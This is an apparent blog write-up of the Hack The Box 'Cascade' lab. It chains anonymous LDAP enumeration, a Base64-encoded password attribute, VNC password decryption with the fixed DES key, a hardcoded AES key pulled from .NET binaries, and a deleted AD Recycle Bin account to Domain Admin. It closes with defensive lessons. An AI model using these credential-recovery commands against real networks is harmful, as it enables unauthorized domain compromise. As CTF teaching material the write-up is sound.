---
title: "HTB: Cascade · from an anonymous LDAP dump to Domain Admin via the AD Recycle Bin"
date: 2026-09-11
draft: false
tags: ["hackthebox", "active-directory", "windows", "privilege-escalation", "reverse-engineering", "vnc"]
summary: "A retired medium Windows Domain Controller where a custom, non-standard LDAP attribute leaks a working credential to anyone unauthenticated, and the trail that follows through a VNC config and a homemade audit tool ends with a deleted admin-equivalent account still sitting in the AD Recycle Bin."
---

## Overview

Cascade is a retired medium-difficulty Windows Domain Controller from Hack The Box, and it's a good lesson in what happens when an organisation builds its own, homegrown alternatives to real secret management. Every credential in this chain is technically "protected", and every one of those protections turns out to be reversible with basic tooling. The path is:

1. **Anonymous RPC and LDAP** enumeration recovers the domain's user list, and a full, unfiltered LDAP attribute dump turns up a custom field nobody meant to leave exposed.
2. That field, `cascadeLegacyPwd`, decodes straight to a working password with no cracking involved.
3. That account's file share access leads to an **exported VNC registry key**, whose password is "encrypted" with a DES key that's identical on every VNC installation on Earth.
4. The next account unlocks a share hosting a **custom internal audit tool**, whose own AES key is sitting in plain sight inside its binaries.
5. That tool's service account belongs to a delegated **AD Recycle Bin** group, and a deleted "temporary admin" account still sitting in the bin turns out to share a password with the real Administrator.

Target: `10.129.60.223`, a Windows Server 2008 R2 Domain Controller for the domain `cascade.local`.

## Enumeration

Full TCP scan with default scripts and version detection:

```bash
nmap -sC -sV -p- -oN nmap-cascade.txt 10.129.60.223
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Microsoft DNS
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap          Microsoft Windows AD LDAP (Domain: cascade.local)
445/tcp  open  microsoft-ds
636/tcp  open  tcpwrapped
3268/tcp open  ldap
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

A Domain Controller, an old Server 2008 R2 build, no web port to poke at. As always, the first move is checking whether anonymous access works anywhere before touching anything else:

```bash
rpcclient -U "" -N 10.129.60.223 -c enumdomusers
```

RPC accepts the null session and hands over 15 domain accounts. `netexec smb 10.129.60.223 -u '' -p ''` confirms the same null auth and the domain name (`cascade.local`), and `kerbrute` cross-checks every username against Kerberos to confirm they're all valid, real accounts.

AS-REP Roasting against the whole list comes back empty (`KDC_ERR_CLIENT_REVOKED`, these accounts just aren't vulnerable to it), and the password policy has no lockout, but a spray of usernames-as-passwords and a couple of common guesses turns up nothing either. Dead end, for now, on the obvious paths.

## Foothold · a legacy attribute nobody cleaned up

The RPC dump only returned usernames, not full LDAP objects. Worth pulling everything, not just `sAMAccountName`:

```bash
ldapsearch -x -H ldap://10.129.60.223 -b "dc=cascade,dc=local" "(objectClass=user)"
```

Buried in the full attribute dump for `r.thompson`:

```
cascadeLegacyPwd: clk0bjVldmE=
```

That's not a hash, hashes don't end in `=` padding or use a mixed-case alphabet like that, it's Base64, a reversible encoding with no secret key at all:

```bash
echo 'clk0bjVldmE=' | base64 -d
# rY4n5eva
```

`r.thompson:rY4n5eva` works over SMB. This is clearly a custom attribute someone added to the schema, presumably during some past password migration, and never cleaned up or locked down.

## From a file share to a VNC password

`r.thompson` can read the `Data` share, and most of its folders are access-denied, except `IT`, which has a `Temp` subfolder per employee. Inside `s.smith`'s temp folder:

```
VNC Install.reg
```

An exported TightVNC registry key, with the server password saved as a hex blob:

```
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

VNC doesn't encrypt this with a secret the administrator chose, it obfuscates it with a **fixed DES key that's identical across every TightVNC/RealVNC installation** and has been public knowledge for years:

```bash
python3 -c "
from Crypto.Cipher import DES
key = bytes.fromhex('e84ad660c4721ae0')
enc = bytes.fromhex('6bcf2a4b6e5aca0f')
print(DES.new(key, DES.MODE_ECB).decrypt(enc))
"
# b'sT333ve2'
```

`s.smith:sT333ve2`.

## A homemade crypto library with the key baked in

`s.smith` unlocks one more share, `Audit$`, hosting a small custom .NET application (`CascAudit.exe`), its own crypto library (`CascCrypto.dll`), and the SQLite database it operates on:

```bash
sqlite3 Audit.db ".dump"
```

```sql
INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');
```

An AES-encrypted credential for `ArkSvc`. The class name inside `CascCrypto.dll` (`AesCrypto`, with `DefaultIV`/`Keysize` properties) makes the algorithm obvious, the only missing piece is the key and IV, and homegrown crypto tends to hardcode both rather than derive them at runtime. `strings` on ASCII alone misses them, .NET stores default configuration values as Unicode:

```bash
strings -el CascCrypto.dll | awk 'length($0)==16'
# 1tdyjCbY1Ix49842        <- IV
strings -el CascAudit.exe | awk 'length($0)==16'
# c4scadek3y654321        <- Key
```

```bash
python3 -c "
from Crypto.Cipher import AES
import base64
key = b'c4scadek3y654321'
iv = b'1tdyjCbY1Ix49842'
ct = base64.b64decode('BQO5l5Kj9MdErXx6Q6AGOw==')
print(AES.new(key, AES.MODE_CBC, iv).decrypt(ct))
"
# b'w3lc0meFr31nd\x03\x03\x03'
```

`ArkSvc:w3lc0meFr31nd` (the trailing `\x03\x03\x03` is just PKCS7 padding).

## Privilege escalation · the AD Recycle Bin still remembers

`ArkSvc` gets WinRM, and `whoami /groups` shows membership in a custom `AD Recycle Bin` group. The logs on the `Audit$` share had already hinted at this: `ArkSvc` had, in the past, moved a user called `TempAdmin` into the recycle bin rather than deleting it outright. An email thread found alongside the audit files explained why it existed: a temporary account used for a network migration, sharing its password with the real Administrator account at the time, meant to be deleted once the migration finished.

"Deleted" in Active Directory, when the AD Recycle Bin feature is enabled, doesn't mean gone, it means moved to a `Deleted Objects` container with every attribute intact for a retention window. `ArkSvc`'s delegated rights let it read that container directly:

```powershell
Import-Module ActiveDirectory
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties *
```

`TempAdmin` is still there, and it carries the same kind of attribute found back in the foothold step:

```
cascadeLegacyPwd: YmFDVDNyMWFOMDBkbGVz
```

```bash
echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d
# baCT3r1aN00dles
```

```bash
netexec winrm 10.129.60.223 -u Administrator -p 'baCT3r1aN00dles'
# (Pwn3d!)
```

Root flag captured. Full domain compromise.

## Lessons learned

Nothing in this chain is a software bug, it's five separate decisions to reinvent secret storage instead of using a real one:

- **A custom "encoded password" attribute in AD is not a credential vault.** If it's reversible without a secret key, it's not protected, full stop, whatever encoding scheme dresses it up.
- **VNC's built-in password obfuscation offers zero real confidentiality.** The key is fixed and public; any exported VNC config should be treated as an exposed cleartext password.
- **Never hardcode a cryptographic key inside the application that uses it.** If the key ships with the binary, so does the ability to decrypt everything it protects.
- **The AD Recycle Bin keeps deleted objects fully readable for a retention period.** A "deleted" migration account with a shared password is not gone, it's a live credential waiting in a container most admins never look at. Purge it, don't just delete it.
- **Never share a password between a temporary account and a real administrative one**, even briefly, and even when the temporary account is meant to be short-lived.

*Flags are partially redacted, per convention.*

---

I also wrote this engagement up as a formal penetration test report, the same format I would deliver to a client, with an executive summary, CVSS-scored findings, and remediation guidance.

📄 [**Download the full pentest report (PDF)**](/reports/Cascade_Pentest_Report/Cascade_Pentest_Report_EN.pdf)
